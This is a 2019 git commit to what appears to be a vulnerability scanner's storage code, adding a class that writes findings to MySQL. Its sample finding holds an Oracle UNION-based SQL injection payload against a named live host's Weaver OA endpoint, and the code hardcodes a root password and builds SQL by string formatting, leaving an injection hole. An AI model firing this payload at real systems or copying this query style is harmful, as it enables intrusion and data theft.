5e5f8cb6a385a1657c53273487ce23bdc209e7b6
Ascotbe <869335729@qq.com>
2019-10-20 18:17:17 +0800

    v0.31:green_heart:

--- text.py
+++ text.py
@@ -1,13 +1,27 @@
 import pymysql  #导入 pymysql
 
-db= pymysql.connect(host="localhost",user="root",password="zhouyuchen",db="medusa",port=3306)
+class VulnerabilityDetails:
 
-# 使用cursor()方法获取操作游标
-cur = db.cursor()
+    def __init__(self,medusa):
 
-sql_insert ="""insert into vulnerability values(4,'liu','1d','12d34','12234','1234','1234')"""
+        # try:
+            self.db= pymysql.connect(host="localhost", user="root", password="zhouyuchen", db="medusa", port=3306)
+            self.name=medusa['name']#漏洞名称
+            self.details=medusa['details']# 结果
+            self.affects=medusa['affects']# 漏洞组件
+            self.desc_content=medusa['desc_content']# 漏洞描述
+            self.suggest=medusa['suggest']# 修复建议
+        # except:
+        #     pass
+    def High(self):
+         # 使用cursor()方法获取操作游标
 
+            cur = self.db.cursor()
+            sql_insert = """insert into vulnerability values(4,'{}','{}','{}','{}','{}','高危')""".format(self.name,self.details,self.affects,self.desc_content,self.suggest)
+            print(sql_insert)
+            cur.execute(sql_insert)
+            # 提交
+            self.db.commit()
 
-cur.execute(sql_insert)
-#提交
-db.commit()
+web=VulnerabilityDetails({'author': 'Ascotbe', 'create_date': '2019-10-13', 'algroup': 'Weaver_WorkflowCenterTreeDataInterfaceInjectionVulnerability', 'name': '泛微OA_WorkflowCenterTreeData接口注入漏洞', 'affects': '泛微OA', 'desc_content': '泛微OA_WorkflowCenterTreeData接口注入漏洞', 'rank': '高危', 'suggest': '尽快升级最新系统', 'details': 'm.landsea.cn 验证数据:\r\nUrl:http://m.landsea.cn/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333\r\nPayload:11111111111)))\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\runion select NULL,instance_name from v$instance order by (((1\r\n'})
+web.High() # serious表示严重，High表示高危，Intermediate表
